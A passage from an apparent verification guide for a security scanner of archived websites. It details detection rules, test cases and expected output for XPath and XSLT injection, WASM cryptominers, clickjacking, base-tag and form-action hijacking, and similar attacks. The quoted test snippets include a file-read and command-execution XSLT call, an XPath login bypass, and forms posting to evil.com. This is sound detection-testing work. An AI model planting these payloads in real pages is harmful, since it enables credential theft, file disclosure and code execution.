**Gist:** XPath is to XML what SQL is to databases. If an app builds an XPath query from user
input — `"//user[name='" + username + "']"` — an attacker enters `' or '1'='1` to return all
users, bypassing authentication. No DROP TABLE equivalent, but an attacker can extract the
entire XML document node by node.

**Scanner logic:** In XSLT, `select="//user[$userParam]"` with variable in predicate = HIGH.
`select="concat('//items/', $searchId)"` = HIGH. `xpath="//item[@id=$id]"` attribute = MEDIUM.

**Test file:** `test_cases/xml/tc15_xpath.xslt`
- Line 9: `select="//user[$userParam]"` — HIGH (variable in XPath predicate)
- Line 14: `select="concat('//items/', $searchId)"` — HIGH (concat with variable)
- Line 18: `<config xpath="//item[@id=$id]"/>` — MEDIUM (xpath attribute with variable)
- Lines 22, 27: Static XPath — NEGATIVE

**Command:**
```bash
python -c "
from scanners.xml_scanner import XMLScanner
s = XMLScanner()
for f in s.scan('test_cases/xml/tc15_xpath.xslt'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** Line 9 as HIGH, line 14 as HIGH, line 18 as MEDIUM. Lines 22, 27 NOT flagged.

**Known false negatives:** Detection is limited to XSLT stylesheets where XPath expressions are syntactically visible as attribute values. XPath injection in server-side code (PHP `DOMXPath::query()`, Python `lxml`) is not in scope for this archive scanner. XPath expressions built via string concatenation in JS (`"//user[name='" + input + "']"`) are not detected.

**Reference:** OWASP XPath Injection: https://owasp.org/www-community/attacks/XPATH_Injection — Defines the analogy to SQL injection; the `' or '1'='1` bypass pattern and the safe parameterised alternative. Also: Halfond et al., "WASP: Protecting Web Applications Using Positive Tainting and Syntax-Aware Evaluation," *IEEE Transactions on Software Engineering 2008* — provides the formal taint-based model that underpins the `concat($var)` and `select="//x[$var]"` patterns the scanner detects. The scanner focuses on XSLT files where XPath expressions are syntactically visible and variable injection is directly observable.

---

### Attack 16: XSLT Injection
**Gist:** XSLT is a full programming language for transforming XML. Some XSLT processors can
read local files (`document('file:///etc/passwd')`), execute OS commands
(`php:function('system','id')`), or run arbitrary code via `<msxsl:script>`. If user input
influences a stylesheet, this is RCE — not just XSS.

**Scanner logic:** `document("file://...")` or `document("http://...")` = CRITICAL.
`php:function(...)`, `<msxsl:script>`, `saxon:evaluate()` = CRITICAL. `document($var)` = HIGH
(SSRF if var is user-controlled). `disable-output-escaping="yes"` = HIGH (raw HTML output,
XSS risk). `system-property(...)` = MEDIUM (info disclosure).

**Test file:** `test_cases/xml/tc16_xslt_injection.xslt`
- Line 11: `document('file:///etc/passwd')` — CRITICAL
- Line 16: `php:function('system', 'id')` — CRITICAL (OS command execution)
- Line 36: `<msxsl:script language="JScript">` with ActiveXObject — CRITICAL
- Line 27: `document($userParam)` — HIGH (user-controlled SSRF)
- Line 32: `disable-output-escaping="yes"` — HIGH
- Lines 21–22: `system-property(...)` — MEDIUM

**Command:**
```bash
python -c "
from scanners.xml_scanner import XMLScanner
s = XMLScanner()
for f in s.scan('test_cases/xml/tc16_xslt_injection.xslt'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** Lines 11, 16, 36 as CRITICAL. Lines 27, 32 as HIGH. Lines 21–22 as MEDIUM.

**Known false negatives:** `exsl:function` (EXSL extension, available in libxslt) and `xt:document` (XT processor) are not in the pattern list. `<xsl:include href="javascript:...">` is theoretically possible in some processors but not detected. XSLT 3.0's `fn:transform()` function (dynamic stylesheet application) is not covered.

**Reference:** Gualtieri, "XSLT Injection Fundamentals," *Infosec Institute*, 2015. https://resources.infosecinstitute.com/topics/hacking/xslt-injection/ — Catalogues the dangerous XSLT functions and elements: `document()` (SSRF/file-read), `<xsl:script>` / `<msxsl:script>` (code execution), `php:function()` / `saxon:evaluate()` (processor-specific RCE), `xsl:result-document` (arbitrary file write). All are implemented in the scanner. Also: OWASP XML Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html

---

## SECTION 4: WebAssembly

---

### Attack 17: WASM Cryptominer
**Gist:** WebAssembly runs at near-native speed, making in-browser crypto mining 10–20x faster
than JS miners. The same Coinhive/CryptoNight attack but using a `.wasm` binary for the
hash computation. WASM files are binary so you can't just grep for strings — but the binary
still contains function names and algorithm constants.

**Scanner logic:** Binary-level search for byte sequences: `cryptonight`, `cn_slow_hash`,
`stratum`, `keccak`, `randomx`, `scrypt`, `coinhive`, etc. Also extracts printable ASCII
strings from the binary and checks export names against a mining function list. 3+ matching
signatures = CRITICAL.

**Test file:** `test_cases/wasm/tc17_cryptominer.wasm` (auto-generated by test_runner.py)

**Command:**
```bash
python test_runner.py  # regenerates the WASM binaries first
python -c "
from scanners.wasm_scanner import WASMScanner
s = WASMScanner()
for f in s.scan('test_cases/wasm/tc17_cryptominer.wasm'):
    print(f'[{f.severity}]: {f.description}')
"
```

**Expected output:** HIGH findings for each individual mining signature found. 1 CRITICAL
for the aggregate (3+ signatures). Verify `tc17_clean.wasm` produces 0 HIGH findings.

**Known false negatives:** Obfuscated WASM miners that strip or encrypt string sections will evade byte-string detection. The `KNOWN_MINER_HASHES` set is currently empty (placeholder) -- hash-based detection requires populating it from MineSweeper/MinerRay publications. Miners using algorithms not in the signature list (e.g., newer algorithms like Autolykos, KawPoW) are not detected.

**Reference:** Konoth et al., "MineSweeper: An In-depth Look into Browser-based Cryptomining," *ACM CCS 2018*. https://dl.acm.org/doi/10.1145/3243734.3243858 — §5 covers WASM-based mining; identifies that miner WASM modules retain algorithm string constants (`cryptonight`, `cn_slow_hash`, `scratchpad`, `keccak`, `stratum`) because WASM export names and embedded strings survive compilation. The scanner's byte-level string search follows this approach. **Citation caveat:** The codebase previously cited "Romano et al., IEEE S&P 2020" for this attack — that citation could **not be verified** at IEEE S&P 2020 or arXiv; the correct primary source is Konoth et al. CCS 2018. If you locate the Romano et al. paper independently, verify the venue before including it. Also relevant: Romano et al., "An Empirical Study of Obfuscated WebAssembly," *WebSci 2020* — covers obfuscated WASM (which the scanner does *not* handle; the byte-string approach only works on non-obfuscated miners).

---

## SECTION 5: HTML Attacks

---

### Attack 18: Missing Subresource Integrity (SRI)
**Gist:** `<script src="https://cdn.example.com/jquery.js">` loads jQuery from a CDN. If
that CDN is compromised, every visitor gets malicious JS — and the browser has no way to
know. The `integrity=` attribute contains a SHA hash of the expected file; the browser
refuses to execute it if the hash doesn't match.

**Scanner logic:** Finds external `<script src="...">` and `<link rel=stylesheet href="...">`.
If no `integrity=` attribute is present, flags as MEDIUM.

**Test file:** `test_cases/html/tc_html_attacks.html`
- Line 5: `<script src="https://cdn.example.com/jquery-3.6.0.min.js">` — no integrity, MEDIUM
- Line 8: `<link rel="stylesheet" href="https://cdn.example.com/bootstrap.min.css">` — MEDIUM
- Lines 11–12: same CDN but WITH `integrity="sha384-..."` — NEGATIVE
- Line 15: local `/js/app.js` — NEGATIVE (local script, no SRI needed)

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_attacks.html'):
    if f.test_name == 'missing_sri':
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
        print(f'  Code: {f.line_content}')
"
```

**Expected output:** 2 MEDIUM findings (lines 5 and 8). Lines 11, 15 NOT flagged.

**Known false negatives:** `<link rel="preload">`, `<link rel="modulepreload">`, and `<link rel="prefetch">` tags loading external resources are not checked for `integrity=`. Dynamic script injection via JS (`document.createElement('script'); el.src = url`) is not detected. Wayback-rewritten URLs (prefix `web.archive.org/web/...`) are treated as external by `_is_external_url` -- this is intentional since they represent originally-external resources.

**Implementation choice: archive-sec-analysis (`sri_scanner/`)**
- Uses BeautifulSoup (more accurate than regex for HTML attribute parsing)
- Also parses CSP headers (`require-sri-for`) and analyzes HSTS from the archived JSON headers
- More complete picture for the longitudinal study: "did the government site add SRI?"

**Reference:** Lauinger et al., "Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web," *NDSS 2017*. https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/thou-shalt-not-depend-on-me-analysing-the-use-of-outdated-javascript-libraries-on-the-web/ — §5 introduces SRI as the recommended countermeasure; this paper's measurement of CDN-hosted libraries is the empirical basis for why missing SRI matters (CDNs can be compromised or coerced). W3C Subresource Integrity specification: https://www.w3.org/TR/SRI/ — defines the `integrity=` attribute format the scanner checks for.

---

### Attack 19: Clickjacking
**Gist:** An attacker loads your bank's transfer page in a transparent `<iframe>` on their
site, overlaid over a fake button. The victim thinks they're clicking "Win a prize!" but
actually confirms a bank transfer. Defence is `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.

**Scanner logic:** HTML: detects hidden/transparent `<iframe>` with `opacity:0` or
`visibility:hidden` or `position:absolute/fixed` in the style. Also checks whether a page
containing forms or a login keyword has any frame-busting defence (meta X-Frame-Options,
CSP `frame-ancestors`, or JS `top !== self`). Absence of defence = MEDIUM.

**Test file:** `test_cases/html/tc_html_attacks.html`
- Line 28: `<iframe style="opacity:0; position:absolute...">` — HIGH (hidden overlay)
- The page has a login form (line 31) and no frame-busting JS — MEDIUM

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_attacks.html'):
    if f.test_name == 'clickjacking':
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** Line 28 as HIGH (hidden iframe). 1 MEDIUM (login page, no frame-busting).

**Known false negatives / systematic FPs:** Pages that use only the `X-Frame-Options` HTTP header for defense (the recommended approach) will be reported as MEDIUM even though they are properly protected -- the header is not in the archived HTML. Expect a high MEDIUM rate on well-configured government sites. The HIGH detection requires the overlay iframe to be inline-styled; CSS-class-based hiding (e.g., `class="hidden"`) is not detected.

**Implementation choice: archive-sec-analysis (`clickjacking_detector/`)**
- Checks `X-Frame-Options` HTTP header from the archived JSON headers — the primary defence mechanism
- HTML-based frame-busting JS is easily bypassed; header-based check is authoritative
- Use for longitudinal header analysis; security_pipeline covers the HTML side

**Reference:** Huang et al., "Clickjacking: Attacks and Defenses," *USENIX Security 2012*. https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/huang — Defines the transparent iframe overlay attack and evaluates frame-busting defences; shows JS-based frame-busting is bypassable via `sandbox` attribute on the outer iframe, making `X-Frame-Options` / `frame-ancestors` the only reliable defence. **Important limitation:** the scanner can only detect inline HTML-level defences (meta tags, JS frame-busting code); pages relying solely on the HTTP `X-Frame-Options` header — the recommended approach — will be flagged as undefended even if they were protected. This produces systematic false positives for header-protected pages in the archive.

---

### Attack 20: Base Tag Hijacking
**Gist:** `<base href="https://evil.com/">` at the top of a page makes every relative URL on
the page resolve to `evil.com`. `<script src="js/app.js">` silently loads from
`https://evil.com/js/app.js`. An attacker who can inject a single `<base>` tag before
other content hijacks all scripts, stylesheets, and form submissions.

**Scanner logic:** Finds `<base href="...">` and flags if the href is an external URL (starts
with `http://`, `https://`, or `//`).

**Test file:** `test_cases/html/tc_html_attacks.html`
- Line 24: `<base href="https://evil.com/hijacked/">` — HIGH

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_attacks.html'):
    if f.test_name == 'base_tag_hijack':
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
        print(f'  Code: {f.line_content}')
"
```

**Expected output:** Line 24 as HIGH.

**Known false negatives:** `<base>` tags without an `href` attribute (only `target=`) are not flagged (correct, no injection risk). A `<base href="/">` (root-relative, not external) is correctly skipped. Injected `<base>` tags that appear mid-document (after some `<script src>` tags) would hijack only subsequent relative URLs -- the scanner flags the tag regardless of position, which is correct for detection.

**Reference:** Barth et al., "Securing Frame Communication in Browsers," *USENIX Security 2008*. https://www.usenix.org/conference/usenixsec08/technical-sessions/presentation/barth — §4 analyses base-tag injection as a navigation hijacking vector; an injected `<base>` tag before other content redirects all relative URLs to an attacker-controlled origin. The scanner's check — external URL in `<base href>` — is the minimal necessary and sufficient condition for this attack.

---

### Attack 21: Meta Refresh Open Redirect
**Gist:** `<meta http-equiv="refresh" content="0;url=https://evil.com/phishing">` redirects
the browser after a delay without any user interaction. An attacker who controls page content
can redirect visitors to a phishing clone of the site. Often used by SEO spam and malware.

**Scanner logic:** Finds `<meta http-equiv="refresh" content="...;url=...">` and flags if
the URL is external.

**Test file:** `test_cases/html/tc_html_attacks.html`
- Line 18: `<meta http-equiv="refresh" content="0;url=https://evil.com/phishing">` — HIGH
- Line 21: internal redirect (`/dashboard`) — NEGATIVE

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_attacks.html'):
    if f.test_name == 'meta_refresh_redirect':
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
        print(f'  Code: {f.line_content}')
"
```

**Expected output:** Line 18 as HIGH. Line 21 NOT flagged.

**Reference:** OWASP Unvalidated Redirects and Forwards Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html — documents `<meta http-equiv="refresh">` as a client-side redirect mechanism abused for phishing and open redirect. CWE-601 (URL Redirection to Untrusted Site). No dedicated academic paper targets meta-refresh specifically; it is covered as a sub-case of open redirect in most web security textbooks.

---

### Attack 22: Form Action Hijacking
**Gist:** `<form action="http://example.com/login">` sends credentials in plaintext over HTTP
— visible to anyone on the network. `<form action="https://evil.com/collect">` sends data
directly to an attacker's server. A `formaction` attribute on a button overrides the form
action, silently redirecting a specific submit.

**Scanner logic:** `action="http://..."` = HIGH (plaintext credentials). `action="https://external.com/..."` = MEDIUM.
`formaction="..."` on buttons/inputs = MEDIUM.

**Test file:** `test_cases/html/tc_html_attacks.html`
- Line 31: `<form action="http://example.com/login">` — HIGH (HTTP)
- Line 38: `<form action="https://evil.com/collect">` — MEDIUM (external HTTPS)
- Line 45: `<button formaction="https://evil.com/steal">` — MEDIUM (override)

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_attacks.html'):
    if f.test_name == 'form_action_hijack':
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
        print(f'  Code: {f.line_content}')
"
```

**Expected output:** Line 31 as HIGH. Lines 38 and 45 as MEDIUM.

**Reference:** Barth et al., "Robust Defenses for Cross-Site Request Forgery," *ACM CCS 2008*. https://dl.acm.org/doi/10.1145/1455770.1455782 — §2 identifies form `action` manipulation as the primary CSRF delivery channel; the `formaction` attribute (HTML5) is an extension of this vector. The scanner's check for HTTP form actions (credential leak) and external domain actions (data exfiltration) maps to the threat model in §3.

---

### Attack 23: Dangling Markup / JavaScript URLs
**Gist:** `<a href="javascript:alert(document.cookie)">` executes JS when clicked — direct
XSS in a link. `<iframe src="data:text/html,<script>alert(1)</script>">` embeds HTML as
a data URL, executing JS. Older browsers also permitted `javascript:` in form actions.

**Scanner logic:** `href|src|action="javascript:..."` = CRITICAL. `<script|iframe src="data:..."` = HIGH.
Also heuristic checks for unclosed attribute quotes that could enable dangling markup injection.

**Test file:** `test_cases/html/tc_html_attacks.html`
- Line 49: `<a href="javascript:alert(document.cookie)">` — CRITICAL
- Line 52: `<iframe src="data:text/html,<script>alert(1)</script>">` — HIGH

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_attacks.html'):
    if f.test_name == 'dangling_markup':
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
        print(f'  Code: {f.line_content}')
"
```

**Expected output:** Line 49 as CRITICAL. Line 52 as HIGH.

**Reference:** Heyes, "Dangling Markup — HTML Scriptless Injection," *PortSwigger Research*, 2018. https://portswigger.net/web-security/cross-site-scripting/dangling-markup — Formalises the dangling markup injection technique (unclosed attribute values capturing subsequent page content). The `javascript:` URL and `data:` URL patterns detected by the scanner are the direct XSS sub-cases of this attack family. Also: OWASP Testing for DOM-based Open Redirect (OTG-CLIENT-004) covers `javascript:` URLs in navigation attributes.

---

### Attack 24: HTML Structural Violations
**Gist:** Inconsistent HTML structure causes different browsers to parse the same file
differently. An attacker can exploit those differences: nested `<form>` tags caused XSS
filter bypasses in IE/Chrome; duplicate `id=` attributes lead to DOM clobbering
(`window.x` is overwritten by `<img id="x">`); unclosed tags shift the DOM in surprising ways.

**Scanner logic:** Nested `<form>` = HIGH. Duplicate `id=` = MEDIUM. Block element inside
inline (`<div>` inside `<span>`) = MEDIUM. Unclosed elements = MEDIUM.

**Test file:** `test_cases/html/tc_html_violations.html`

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_violations.html'):
    if f.test_name == 'html_violation':
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** At least 1 HIGH (nested form) and 5+ MEDIUM findings.

**Implementation choice: security_pipeline**
- Integrated directly into the pipeline's HTML scanner
- Covers the DOM clobbering angle (duplicate IDs) which is specifically relevant
  to the archive study
- archive-sec-analysis `html-violation-analyzer` uses a rule-based checker with named rules
  (DE*, DM*, etc.) but these overlap significantly with security_pipeline's ViolationParser

**Reference:** Weinberger et al., "A Systematic Analysis of XSS Sanitization in Web Application Frameworks," *ESORICS 2011*. https://link.springer.com/chapter/10.1007/978-3-642-23822-2_4 — §4 shows how structural HTML violations (nested forms, unclosed tags, block-in-inline nesting) cause browser parse-tree inconsistencies that enable XSS filter bypasses. Duplicate IDs as a DOM clobbering vector is covered by Gareth Heyes, "DOM clobbering strikes back," *PortSwigger Research*, 2020: https://portswigger.net/research/dom-clobbering-strikes-back

---

### Attack 25: Vulnerable Library Detection
**Gist:** jQuery 1.9.1, Lodash 4.17.4, and dozens of other libraries have published CVEs.
Sites that loaded them years ago may still be running them — "it still works" — but public
exploit code exists. A jQuery XSS from 2020 (CVE-2020-11022) affects every jQuery < 3.5.0,
a version range covering hundreds of millions of site snapshots.

**Scanner logic:** Extracts version strings from JS file headers/comments using regex. Compares
against a CVE database of 10 libraries. Reports each CVE where the detected version is ≤ the
last vulnerable version. Also uses the `retire` CLI if installed.

**Test file:** `test_cases/js/tc_retire_jquery.js` and `test_cases/js/tc_retire_lodash.js`

**Command:**
```bash
python -c "
from scanners.retire_scanner import RetireScanner
s = RetireScanner()
print('--- jQuery 1.9.1 ---')
for f in s.scan('test_cases/js/tc_retire_jquery.js'):
    print(f'  [{f.severity}]: {f.description}')
print('--- Lodash 4.17.4 ---')
for f in s.scan('test_cases/js/tc_retire_lodash.js'):
    print(f'  [{f.severity}]: {f.description}')
print('--- Clean JS ---')
results = s.scan('test_cases/js/tc_retire_clean.js')
print(f'  Findings: {len(results)} (expected 0)')
"
```

**Expected output:** jQuery: 2+ CRITICAL (CVE-2020-11022, CVE-2020-11023), 2+ HIGH.
Lodash: 2+ CRITICAL (CVE-2021-23337, CVE-2019-10744), 3+ HIGH. Clean file: 0 findings.

**Known false negatives:** Libraries not in the built-in database (React, Vue older versions, Prototype.js, Dojo, MooTools, etc.) require the `retire` CLI for coverage. The version extractor reads only the first 200 KB of each JS file -- version strings in large bundles that appear after that offset will be missed. Bundled/concatenated files containing multiple libraries will only detect the first version string matched per library.

**Implementation choice: security_pipeline (`retire_scanner.py`)**
- Same core approach (retire CLI + built-in CVE DB) as archive-sec-analysis's retire-custom
- Built-in DB works without `npm install -g retire` — no external dependency
- For the archive context, both implementations are equivalent; security_pipeline's is
  simpler to integrate into the pipeline driver

**Reference:** Lauinger et al., "Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web," *NDSS 2017*. https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/thou-shalt-not-depend-on-me-analysing-the-use-of-outdated-javascript-libraries-on-the-web/ — The foundational measurement paper: scans 133,000 websites, finds 37% include at least one vulnerable JS library, with jQuery as the dominant case. The scanner's version-detection approach (regex on file header + version string) is exactly the method in §4.1. Retire.js project: https://retirejs.github.io/retire.js/ — open-source tool whose CVE database is the basis for the built-in `VULN_DB` in `retire_scanner.py`. **Minor caveat:** the React entry (CVE-2015-1164) should be verified — `dangerouslySetInnerHTML` is an intentional React API, not a CVE-tracked vulnerability.

---

## SECTION 6: Inline Script/Style Delegation

### Attack 26: Inline Script Scanning (HTML)
**Gist:** JS scanners normally only process `.js` files. But many vulnerabilities live in
`<script>` blocks inline in HTML. The HTML scanner extracts each `<script>` block and passes
its contents to the full JS scanner, with line numbers adjusted back to the HTML file.

**Test file:** `test_cases/html/tc_html_attacks.html`, lines 55–62:
```html
<script>
    eval(location.hash.slice(1));
    var miner = new CoinHive.Anonymous('key123');
    window.addEventListener('message', function(event) {
        document.getElementById('x').innerHTML = event.data;
    });
</script>
```

**Command:**
```bash
python -c "
from scanners.html_scanner import HTMLScanner
s = HTMLScanner()
for f in s.scan('test_cases/html/tc_html_attacks.html'):
    if 'INLINE SCRIPT' in f.description:
        print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** `eval()` → dangerous_sink CRITICAL, `CoinHive.Anonymous` → cryptominer_js CRITICAL,
`addEventListener('message',...)` with no origin + innerHTML → postmessage_audit CRITICAL.
All annotated as `[INLINE SCRIPT line 55]`.

---

## Running All Verifications

```bash
cd /path/to/subset_collected_data/security_pipeline/
bash verification/run_verification.sh
```

This script runs every attack check above and prints PASS/FAIL for each.

---

## Methodology Notes and Known Limitations

The following issues were identified when cross-checking scanner logic against the cited papers.
These should be disclosed in the paper's methodology section.

| # | Attack | Issue | Severity |
|---|--------|-------|----------|
| 1 | Prototype Pollution | `constructor.prototype` and `__proto__` assignment patterns now detected (HIGH). Remaining gaps: `Object.defineProperty(Object.prototype,...)`, `Object.setPrototypeOf()`, and hasOwnProperty-guarded for-in loops (flagged as HIGH but are safe — disclose as known FP class) | Disclose in paper |
| 2 | ReDoS | Scanner uses syntactic nested-quantifier matching; Davis et al. FSE 2018 use automaton-based complexity analysis. The scanner detects the *shape* of ReDoS-prone regexes, not the *complexity*. Describe as "heuristic" in the paper | Fix framing before paper |
| 3 | Dangerous Sinks | `setTimeout(varName, delay)` fires on function callbacks (false positive). Only string arguments are dangerous. Pattern needs tightening | Fix before paper |
| 4 | WASM Cryptominer | "Romano et al., IEEE S&P 2020" citation unverified — cannot locate this paper at IEEE S&P 2020. Use Konoth et al. CCS 2018 as primary reference instead | Fix citation before paper |
| 5 | Clickjacking | Pages using only HTTP `X-Frame-Options` headers (recommended approach) are flagged as unprotected. Creates systematic false positives for header-protected pages in the archive. Must be disclosed | Disclose in paper |
| 6 | CSS Attacks (10–12) | No peer-reviewed paper citation available; sources are PortSwigger research blog and GitHub PoC. Attacks are technically correct and widely accepted in practitioner literature | Disclose in paper |
| 7 | Vulnerable Library | React CVE-2015-1164 entry is questionable — `dangerouslySetInnerHTML` is an intentional API opt-in, not a CVE. Consider removing this entry | Verify before paper |
